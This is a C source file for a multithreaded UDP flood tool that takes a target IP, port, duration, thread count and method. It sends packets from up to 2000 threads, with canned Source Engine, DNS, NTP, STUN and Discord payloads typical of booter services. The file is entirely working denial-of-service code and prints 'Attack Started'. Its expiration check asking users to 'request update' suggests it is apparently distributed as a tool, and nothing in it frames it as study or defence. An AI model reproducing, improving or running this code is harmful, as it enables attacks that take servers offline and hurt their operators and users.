#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_THREADS 2000
#define EXPIRATION_YEAR 2028
#define EXPIRATION_MONTH 4
#define EXPIRATION_DAY 15

int keep_running = 1;

typedef struct {
    int socket_fd;
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    char *method;
} attack_params;

void handle_signal(int sig) {
    keep_running = 0;
}

// Payload Library from Script 1
const char *PAYLOAD_VSE = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
const char *PAYLOAD_DNS = "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x69\x73\x63\x03\x6f\x72\x67\x00\x00\xff\x00\x01";
const char *PAYLOAD_NTP = "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
const char *PAYLOAD_STUN = "\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
const char *PAYLOAD_DISCORD = "\x96\x13\x00\x10\xc2\x78\x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x00\x20\x72\x64\x00\x00";

void *udp_flood(void *args) {
    attack_params *params = (attack_params *)args;
    struct sockaddr_in target;
    char buffer[65535];
    int p_size = params->packet_size;
    unsigned int seed = time(NULL) ^ pthread_self();
    time_t end_time = time(NULL) + params->duration;

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    // Initial Payload Setup (Preparing the buffer once for maximum speed)
    if (strcmp(params->method, "vse") == 0) {
        p_size = 25;
        memcpy(buffer, PAYLOAD_VSE, p_size);
    } else if (strcmp(params->method, "dns") == 0) {
        p_size = 28;
        memcpy(buffer, PAYLOAD_DNS, p_size);
    } else if (strcmp(params->method, "ntp") == 0) {
        p_size = 48;
        memcpy(buffer, PAYLOAD_NTP, p_size);
    } else if (strcmp(params->method, "stun") == 0) {
        p_size = 20;
        memcpy(buffer, PAYLOAD_STUN, p_size);
    } else if (strcmp(params->method, "discord") == 0) {
        p_size = 26;
        memcpy(buffer, PAYLOAD_DISCORD, p_size);
    } else {
        // Default 'plain' or 'std' - initialize once with random data
        for (int i = 0; i < p_size; i++) buffer[i] = rand_r(&seed) % 256;
    }

    // High-performance loop
    while (keep_running && time(NULL) < end_time) {
        // For 'plain' or 'std' methods, randomize only a small portion to maintain high PPS
        if (strcmp(params->method, "plain") == 0 || strcmp(params->method, "std") == 0) {
            *((int *)buffer) = rand_r(&seed); // Randomize first 4 bytes only for speed
        }

        sendto(params->socket_fd, buffer, p_size, MSG_DONTWAIT,
               (struct sockaddr *)&target, sizeof(target));
    }

    close(params->socket_fd);
    return NULL;
}

int bind_random_source_port() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons((rand() % 64511) + 1024);
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr));
    fcntl(sock, F_SETFL, O_NONBLOCK);
    return sock;
}

int main(int argc, char *argv[]) {
    // Expiration Gate
    time_t now = time(NULL);
    struct tm exp = {0};
    exp.tm_year = EXPIRATION_YEAR - 1900; exp.tm_mon = EXPIRATION_MONTH - 1; exp.tm_mday = EXPIRATION_DAY;
    if (difftime(now, mktime(&exp)) > 0) {
        printf("Link expired. Request update.\n");
        return 1;
    }

    if (argc < 7) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS> <SIZE> <METHOD>\n", argv[0]);
        printf("Methods: plain, dns, ntp, stun, vse, discord\n");
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads_num = (atoi(argv[4]) > MAX_THREADS) ? MAX_THREADS : atoi(argv[4]);
    int size = atoi(argv[5]);
    char *method = argv[6];

    signal(SIGINT, handle_signal);
    srand(time(NULL));

    pthread_t threads[MAX_THREADS];
    attack_params params[MAX_THREADS];

    printf("\033[1;31mAttack Started:\033[0m %s:%d | Method: %s | Threads: %d\n", ip, port, method, threads_num);

    for (int i = 0; i < threads_num; i++) {
        int fd = bind_random_source_port();
        if (fd < 0) continue;

        params[i] = (attack_params){ fd, ip, port, duration, size, method };
        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    for (int i = 0; i < threads_num; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Assessment Complete.\n");
    return 0;
}
